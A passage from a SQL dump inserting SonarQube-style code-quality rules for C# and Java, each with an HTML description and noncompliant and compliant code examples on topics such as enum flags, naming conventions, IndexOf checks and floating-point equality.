    <code>enum</code>s are usually used to identify distinct elements in a set of values. However <code>enum</code>s can be treated as bit fields and 
    bitwise operations can be used on them to combine the values. This is a good way of specifying multiple elements of set with a single value. 
    When <code>enum</code>s are used this way, it is a best practice to mark the <code>enum</code> with the <code>FlagsAttribute</code>.
</p>
<h2>Noncompliant Code Example</h2>
<pre>
enum Permissions
{
  None = 0,
  Read = 1,
  Write = 2,
  Execute = 4
}
// ...
var x = Permissions.Read | Permissions.Write;  // Noncompliant; enum is not marked with [Flags]
</pre>
<h2>Compliant Solution</h2>
<pre>
[Flags]
enum Permissions
{
  None = 0,
  Read = 1,
  Write = 2,
  Execute = 4
}
// ...
var x = Permissions.Read | Permissions.Write;
</pre>', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'convention', false, 'HTML', 1510817812219, 1510817812220, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (381, 'Class names should comply with a naming convention', 'S101', NULL, 'csharpsquid', '<p>
Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate.
This rule allows to check that all class names match a provided regular expression.
</p>

<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression <code>^([A-HJ-Z][a-zA-Z0-9]+|I[a-z0-9][a-zA-Z0-9]*|[A-Z][a-zA-Z0-9]+Extensions)$</code>:</p>
<pre>
class my_class {...}
</pre>

<h2>Compliant Solution</h2>

<pre>
class MyClass {...}
</pre>', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'convention', false, 'HTML', 1510817812222, 1510817812222, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (382, '"IndexOf" checks should not be for positive numbers', 'S2692', NULL, 'csharpsquid', '<p>
    Most checks against an <code>IndexOf</code> value compare it with -1 because 0 is a valid index. Any checks which look for
    values <code>&gt;0</code> ignore the first element, which is likely a bug. If the intent is merely to check inclusion of a
    value in a <code>string</code>, <code>List</code>, or an array, consider using the <code>Contains</code> method instead.
</p>
<p>
    This rule raises an issue when an <code>IndexOf</code> value retrieved from a <code>string</code>, <code>List</code>,
    or array is tested against <code>&gt;0</code>.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
string color = "blue";
string name = "ishmael";

List&lt;string&gt; strings = new List&lt;string&gt; ();
strings.add(color);
strings.add(name);
string[] stringArray = strings.ToArray();

if (strings.IndexOf(color) &gt; 0) // Noncompliant
{
  // ...
}
if (name.IndexOf("ish") &gt; 0) // Noncompliant
{
  // ...
}
if (name.IndexOf("ae") &gt; 0) // Noncompliant
{
  // ...
}
if (Array.IndexOf(stringArray, color) &gt; 0) // Noncompliant
{
  // ...
}
</pre>

<h2>Compliant Solution</h2>
<pre>
string color = "blue";
string name = "ishmael";
List&lt;string&gt; strings = new List&lt;string&gt; ();
strings.add(color);
strings.add(name);
string[] stringArray = strings.ToArray();
if (strings.IndexOf(color) &gt; -1)
{
  // ...
}
if (name.IndexOf("ish") &gt;= 0)
{
  // ...
}
if (name.Contains("ae")
{
  // ...
}
if (Array.IndexOf(stringArray, color) &gt;= 0)
{
  // ...
}
</pre>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'pitfall', false, 'HTML', 1510817812224, 1510817812225, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (383, 'Assignments should not be made from within sub-expressions', 'S1121', NULL, 'csharpsquid', '<p>
    Assignments within sub-expressions are hard to spot and therefore make the code less readable.
    It is also a common mistake to write <code>=</code> when <code>==</code> was meant.
    Ideally, expressions should should not have side-effects.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
doSomething(i = 42);
</pre>

<h2>Compliant Solution</h2>
<pre>
i = 42;
doSomething(i);
// or
doSomething(i == 42);  // Perhaps in fact the comparison operator was expected
</pre>

<h2>Exceptions</h2>
Assignments inside lambda and delegate expressions are allowed.

<h2>See</h2>
<ul>
    <li>MISRA C:2004, 13.1 - Assignment operators shall not be used in expressions that yield a Boolean value</li>
    <li>MISRA C++:2008, 6-2-1 - Assignment operators shall not be used in sub-expressions</li>
    <li>MISRA C:2012, 13.4 - The result of an assignment operator should not be used</li>
    <li><a href="http://cwe.mitre.org/data/definitions/481.html">MITRE, CWE-481</a> - Assigning instead of Comparing</li>
</ul>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cwe,misra,suspicious', false, 'HTML', 1510817812226, 1510817812226, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (949, 'Class names should comply with a naming convention', 'S00101', 'S101', 'squid', '<p>Shared coding conventions allow teams to collaborate effectively. This rule allows to check that all class names match a provided regular
expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression <code>^[A-Z][a-zA-Z0-9]*$</code>:</p>
<pre>
class my_class {...}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {...}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'convention', false, 'HTML', 1510817812992, 1510817812992, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (950, 'Method names should comply with a naming convention', 'S00100', 'S100', 'squid', '<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks that all method names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression <code>^[a-z][a-zA-Z0-9]*$</code>:</p>
<pre>
public int DoSomething(){...}
</pre>
<h2>Compliant Solution</h2>
<pre>
public int doSomething(){...}
</pre>
<h2>Exceptions</h2>
<p>Overriding methods are excluded. </p>
<pre>
@Override
public int Do_Something(){...}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'convention', false, 'HTML', 1510817812993, 1510817812994, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (951, 'Enumeration should not be implemented', 'S1150', NULL, 'squid', '<p>From the official Oracle Javadoc:</p>
<blockquote>
  <p>NOTE: The functionality of this Enumeration interface is duplicated by the Iterator interface. In addition, Iterator adds an optional remove
  operation, and has shorter method names. New implementations should consider using Iterator in preference to Enumeration.</p>
</blockquote>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass implements Enumeration {  // Non-Compliant
  /* ... */
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass implements Iterator {     // Compliant
  /* ... */
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'obsolete', false, 'HTML', 1510817812995, 1510817812995, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (384, 'Floating point numbers should not be tested for equality', 'S1244', NULL, 'csharpsquid', '<p>
    Floating point math is imprecise because of the challenges of storing such values in a binary
    representation. Even worse, floating point math is not associative; push a <code>float</code> or a <code>double</code>
    through a series of simple mathematical operations and the answer will be different based on
    the order of those operation because of the rounding that takes place at each step.
</p>
<p>
    Even simple floating point assignments are not simple:
</p>
<pre>
float f = 0.100000001f; // 0.1
double d = 0.10000000000000001; // 0.1
</pre>

<p>
    (Results will vary based on compiler and compiler settings)
</p>
<p>
    Therefore, the use of the equality (<code>==</code>) and inequality (<code>!=</code>) operators on
    <code>float</code> or <code>double</code> values is almost always an error.
</p>
<p>
    This rule checks for the use of direct and indirect equality/inequailty tests on floats and doubles.
</p>


<h2>Noncompliant Code Example</h2>
<pre>
float myNumber = 3.146f;
if ( myNumber == 3.146f ) //Noncompliant. Because of floating point imprecision, this will be false
{
  // ...
}

if (myNumber &lt;= 3.146f &amp;&amp; mNumber &gt;= 3.146f) // Noncompliant indirect equality test
{
  // ...
}

if (myNumber &lt; 4 || myNumber &gt; 4) // Noncompliant indirect inequality test
{
  // ...
}
</pre>

<h2>See</h2>
<ul>
    <li>MISRA C:2004, 13.3 - Floating-point expressions shall not be tested for equality or inequality.</li>
    <li>MISRA C++:2008, 6-2-2 - Floating-point expressions shall not be directly or indirectly tested for equality or inequality</li>
</ul>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'misra', false, 'HTML', 1510817812227, 1510817812228, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (385, '"IEnumerable" LINQs should be simplified', 'S2971', NULL, 'csharpsquid', '<p>
    In the interests of readability, code that can be simplified should be simplified. To that end, there are several
    ways <code>IEnumerable LINQ</code>s can be simplified
</p>
<ul>
    <li>Use <code>OfType</code> instead of using <code>Select</code> with <code>as</code> to type cast elements and then
    null-checking in a query expression to choose elements based on type.</li>
    <li>Use <code>OfType</code> instead of using <code>Where</code> and the <code>is</code> operator, followed by a cast
    in a <code>Select</code></li>
    <li>Use an expression in <code>Any</code> instead of <code>Where(element => [expression]).Any()</code>.</li>
    <li>Use <code>Count</code> instead of <code>Count()</code> when it''s available.</li>
    <li>Don''t call <code>ToArray()</code> or <code>ToList()</code> in the middle of a query chain.</li>
</ul>

<h2>Noncompliant Code Example</h2>
<pre>
seq1.Select(element => element as T).Any(element => element != null);  // Noncompliant; use OfType
seq2.Select(element => element as T).Any(element => element != null &amp;&amp; CheckCondition(element));  // Noncompliant; use OfType
seq3.Where(element => element is T).Select(element => element as T); // Noncompliant; use OfType
seq4.Where(element => element is T).Select(element => (T)element); // Noncompliant; use OfType
seq.Where(element => [expression]).Any();  // Noncompliant; use Any([expression])
</pre>

<h2>Compliant Solution</h2>
<pre>
seq1.OfType&lt;T&gt;().Any();
seq2.OfType&lt;T&gt;().Any(element => CheckCondition(element));
seq3.OfType&lt;T&gt;();
seq4.OfType&lt;T&gt;();
seq.Any(element => [expression])
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'clumsy', false, 'HTML', 1510817812231, 1510817812232, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (386, 'Redundant modifiers should be removed', 'S2333', NULL, 'csharpsquid', '<p>
    Unnecessary keywords simply clutter the code and should be removed. Specifically:
    <ul>
        <li><code>partial</code> on type declarations that are completely defined in one place</li>
        <li><code>sealed</code> on members of <code>sealed</code> classes</li>
        <li><code>unsafe</code> method or block inside construct already marked with <code>unsafe</code>, or when there are no <code>unsafe</code>
        constructs in the block</li>
    </ul>
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public partial class MyClass // Noncompliant
{
  public virtual void Method()
  {
  }
}

public sealed class MyOtherClass : MyClass
{
  public sealed override void Method() // Noncompliant
  {
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
public class MyClass
{
  public virtual void Method()
  {
  }
}

public sealed class MyOtherClass : MyClass
{
  public override void Method()
  {
  }
}
</pre>', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'finding,unused', false, 'HTML', 1510817812232, 1510817812233, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1091, 'Package names should comply with a naming convention', 'S00120', 'S120', 'squid', '<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that all package names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[a-z]+(\.[a-z][a-z0-9]*)*$</code>:</p>
<pre>
package org.exAmple; // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
package org.example;
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'convention', false, 'HTML', 1510817813181, 1510817813181, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1092, 'Statements should be on separate lines', 'S00122', 'S122', 'squid', '<p>For better readability, do not put more than one statement on a single line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if(someCondition) doSomething();
</pre>
<h2>Compliant Solution</h2>
<pre>
if(someCondition) {
  doSomething();
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1min', NULL, NULL, 'style', false, 'HTML', 1510817813183, 1510817813183, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1095, 'Value-based objects should not be serialized', 'S3437', NULL, 'squid', '<p>According to the documentation,</p>
<blockquote>
  A program may produce unpredictable results if it attempts to distinguish two references to equal values of a value-based class, whether directly
  via reference equality or indirectly via an appeal to synchronization, identity hashing, serialization...
</blockquote>
<p>For example (credit to Brian Goetz), imagine Foo is a value-based class:</p>
<pre>
Foo[] arr = new Foo[2];
arr[0] = new Foo(0);
arr[1] = new Foo(0);
</pre>
<p>Serialization promises that on deserialization of arr, elements 0 and 1 will not be aliased. Similarly, in:</p>
<pre>
Foo[] arr = new Foo[2];
arr[0] = new Foo(0);
arr[1] = arr[0];
</pre>
<p>Serialization promises that on deserialization of <code>arr</code>, elements 0 and 1 <strong>will</strong> be aliased.</p>
<p>While these promises are coincidentally fulfilled in current implementations of Java, that is not guaranteed in the future, particularly when true
value types are introduced in the language.</p>
<p>This rule raises an issue when a <code>Serializable</code> class defines a non-transient, non-static field field whose type is a known serializable
value-based class. Known serializable value-based classes are: all the classes in the <code>java.time</code> package except <code>Clock</code>; the
date classes for alternate calendars: <code>HijrahDate</code>, <code>JapaneseDate</code>, <code>MinguoDate</code>, <code>ThaiBuddhistDate</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass implements Serializable {
  private HijrahDate date;  // Noncompliant; mark this transient
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass implements Serializable {
  private transient HijrahDate date;
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://docs.oracle.com/javase/8/docs/api/java/lang/doc-files/ValueBased.html">Value-based classes</a> </li>
</ul>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'java8,lock-in,serialization', false, 'HTML', 1510817813186, 1510817813186, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (388, 'Boolean literals should not be redundant', 'S1125', NULL, 'csharpsquid', '<p>
    Redundant Boolean literals should be removed from expressions to improve readability.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
if (booleanVariable == true) { /* ... */ }
if (booleanVariable != true) { /* ... */ }
if (booleanVariable || false) { /* ... */ }
doSomething(!false);

booleanVariable = condition ? true : exp;
booleanVariable = condition ? false : exp;
booleanVariable = condition ?  exp : true;
booleanVariable = condition ?  exp : false;
booleanVariable = condition ?  true : false;
</pre>

<h2>Compliant Solution</h2>
<pre>
if (booleanVariable) { /* ... */ }
if (!booleanVariable) { /* ... */ }
if (booleanVariable) { /* ... */ }
doSomething(true);

booleanVariable = condition || exp;
booleanVariable = !condition && exp;
booleanVariable = !condition ||  exp;
booleanVariable = condition && exp;
booleanVariable = condition;
</pre>', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'clumsy', false, 'HTML', 1510817812238, 1510817812239, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (389, 'Identical expressions should not be used on both sides of a binary operator', 'S1764', NULL, 'csharpsquid', '<p>
Using the same value on either side of a binary operator is almost always a mistake. In the case of logical operators, it is either a copy/paste error and therefore a bug, or it is simply wasted code, and should be simplified. In the case of bitwise operators and most binary mathematical operators, having the same value on both sides of an operator yields predictable results, and should be simplified.
</p>
<p>
This rule ignores <code>*</code>, <code>+</code>, and <code>=</code>.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
if ( a == a ) // always true
{
  doZ();
}
if ( a != a ) // always false
{
  doY();
}
if ( a == b &amp;&amp; a == b ) // if the first one is true, the second one is too
{
  doX();
}
if ( a == b || a == b ) // if the first one is true, the second one is too
{
  doW();
}

int j = 5 / 5; //always 1
int k = 5 - 5; //always 0
</pre>

<h2>Compliant Solution</h2>
<pre>
doZ();

if ( a == b )
{
  doX();
}
if ( a == b )
{
  doW();
}

int j = 1;
int k = 0;
</pre>

<h2>Exceptions</h2>
Left-shifting 1 onto 1 is common in the construction of bit masks, and is ignored.
<pre>
int i = 1 << 1; // Compliant
int j = a << a; // Noncompliant
</pre>

<h2>See</h2>

<ul>
    <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C</a> - Detect and remove code that has no effect</li>
    <li> <a href="https://www.securecoding.cert.org/confluence/x/SIIyAQ">CERT, MSC12-CPP</a> - Detect and remove code that has no effect</li>
    <li>Rule S1656 - Implements a check on <code>=</code>.</li>
</ul>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'cert', false, 'HTML', 1510817812240, 1510817812240, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (390, 'Strings should not be concatenated using "+" in a loop', 'S1643', NULL, 'csharpsquid', '<p>
    <code>StringBuilder</code> is more efficient than string concatenation, especially when the operator is repeated over and over as in loops.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
string str = "";
for (int i = 0; i &lt; arrayOfStrings.Length; ++i)
{
  str = str + arrayOfStrings[i];
}
</pre>

<h2>Compliant Solution</h2>

<pre>
StringBuilder bld = new StringBuilder();
for (int i = 0; i &lt; arrayOfStrings.Length; ++i)
{
  bld.Append(arrayOfStrings[i]);
}
string str = bld.ToString();
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'performance', false, 'HTML', 1510817812241, 1510817812241, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (391, 'Implementations should be provided for "partial" methods', 'S3251', NULL, 'csharpsquid', '<p>
    <code>partial</code> methods allow an increased degree of flexibility in programming a system. Hooks can be added to generated code
    by invoking methods that define their signature, but might not have an implementation yet. But if the implementation is still missing
    when the code makes it to production, the compiler silently removes the call. In the best case scenario, such calls simply represent
    cruft, but in they worst case they are critical, missing functionality, the loss of which will lead to unexpected results at runtime.
</p>
<p>
    This rule raises an issue for partial methods for which no implementation can be found in the assembly.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
partial class C
{
  partial void M(); //Noncompliant

  void OtherM()
  {
    M(); //Noncompliant. Will be removed.
  }
}
</pre>', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'suspicious', false, 'HTML', 1510817812242, 1510817812242, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (392, 'Redundant casts should not be used', 'S1905', NULL, 'csharpsquid', '<p>
    Unnecessary casting expressions make the code harder to read and understand.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public int Example(int i)
{
  return (int) (i + 42); // Noncompliant
}
public IEnumerable&lt;int&gt; ExampleCollection(IEnumerable&lt;int&gt; coll)
{
  return coll.Reverse().OfType&lt;int&gt;(); // Noncompliant
}
</pre>

<h2>Compliant Solution</h2>
<pre>
public int Example(int i)
{
  return i + 42;
}
public IEnumerable&lt;int&gt; ExampleCollection(IEnumerable&lt;int&gt; coll)
{
  return coll.Reverse();
}
</pre>', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'clumsy', false, 'HTML', 1510817812244, 1510817812247, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (393, 'Empty statements should be removed', 'S1116', NULL, 'csharpsquid', '<p>
  Empty statements, i.e. <code>;</code>, are usually introduced by mistake, for example because:
  <ul>
    <li>It was meant to be replaced by an actual statement, but this was forgotten.</li>
    <li>There was a typo which lead the semicolon to be doubled, i.e. <code>;;</code>.</li>
  </ul>
</p>

<h2>Noncompliant Code Example</h2>
<pre>
void doSomething()
{
  ; // Noncompliant - was used as a kind of TODO marker
}

void doSomethingElse()
{
  Console.WriteLine("Hello, world!");;  // Noncompliant - double ;
  ...
  // Rarely, they are used on purpose as the body of a loop. It is a bad practice to
  // have side-effects outside of the loop body
  for (int i = 0; i < 3; Console.WriteLine(i), i++); // Noncompliant
  ...
}
</pre>

<h2>Compliant Solution</h2>
<pre>
void doSomething()
{
}

void doSomethingElse()
{
  Console.WriteLine("Hello, world!");
  ...
  for (int i = 0; i < 3; i++)
  {
    Console.WriteLine(i);
   }
  ...
}
</pre>

<h2>See</h2>

<ul>
    <li>MISRA C:2004, 14.3 - Before preprocessing, a null statement shall only occur on a line by itself; it may be followed by a comment provided that the first character following the null statement is a white-space character.</li>
    <li>MISRA C++:2008, 6-2-3 - Before preprocessing, a null statement shall only occur on a line by itself; it may be followed by a comment, provided that the first character following the null statement is a white-space character.</li>
    <li><a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C</a> - Detect and remove code that has no effect</li>
    <li><a href="https://www.securecoding.cert.org/confluence/x/SIIyAQ">CERT, MSC12-CPP</a> - Detect and remove code that has no effect</li>
</ul>', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'cert,misra,unused', false, 'HTML', 1510817812247, 1510817812248, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (394, '"switch" statements should not have too many "case" clauses', 'S1479', NULL, 'csharpsquid', '<p>
  When <code>switch</code> statements have a large set of <code>case</code> clauses, it is usually an attempt to map two sets of data. A real map structure would be more readable and maintainable, and should be used instead.
</p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'brain-overload', false, 'HTML', 1510817812249, 1510817812249, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (395, 'Unused type parameters should be removed', 'S2326', NULL, 'csharpsquid', '<p>
    Type parameters that aren''t used are dead code, which can only distract and possibly confuse
    developers during maintenance. Therefore, unused type parameters should be removed.
</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MoreMath&lt;T&gt; // Noncompliant; &lt;T&gt;is ignored
{
  public int Add&lt;T&gt;(int a, int b) // Noncompliant; &lt;T&gt; is ignored
  {
    return a + b;
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
public class MoreMath
{
  public int Add (int a, int b)
  {
    return a + b;
  }
}
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'unused', false, 'HTML', 1510817812251, 1510817812252, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (396, 'Local variables should not shadow class fields', 'S1117', NULL, 'csharpsquid', '<p>
    Shadowing fields with a local variable or with a method parameter is a bad practice that
    reduces code readability: It makes it confusing to know whether the field or the variable
    is being used.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
class Foo
{
  public int myField;

  public void doSomething()
  {
    int myField = 0;
    ...
  }

  public void doSomethingElse(int myField)
  {
    ...
  }
}
</pre>

<h2>Exceptions</h2>
<p>
    Constructors are exceptions; it is common practice to name arguments for the fields the
    values will be assigned to. Static methods are also excepted.
</p>

<pre>
class Foo {
  public int myField;

  public Foo(int myField)
  {
    this.myField = myField;
  }

  public static Foo build(int myField)
  {
    ...
  }
}
